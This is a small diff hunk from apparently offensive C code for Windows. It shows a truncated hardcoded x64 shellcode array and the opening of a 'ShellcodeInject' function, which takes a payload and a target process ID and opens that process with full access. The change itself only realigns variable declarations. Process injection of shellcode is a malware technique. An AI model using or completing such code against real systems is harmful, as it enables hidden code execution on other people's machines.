@@ -48,12 +48,12 @@ char shellcode_x64[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00
  * @return BOOL condition based on operation sucess.
  */
 BOOL ShellcodeInject(IN PBYTE Payload, IN SIZE_T sPayloadSize, IN DWORD PID){
-    BOOL STATE           = TRUE;
-    DWORD  OldProtect    = 0;
-    DWORD  TID           = 0;
-    HANDLE hProcess      = NULL;
-    HANDLE hThread       = NULL;
-    LPVOID Buffer        = NULL;
+    BOOL   STATE           = TRUE;
+    DWORD  OldProtect      = 0;
+    DWORD  TID             = 0;
+    HANDLE hProcess        = NULL;
+    HANDLE hThread         = NULL;
+    LPVOID Buffer          = NULL;
 
     //handle to process.
     hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
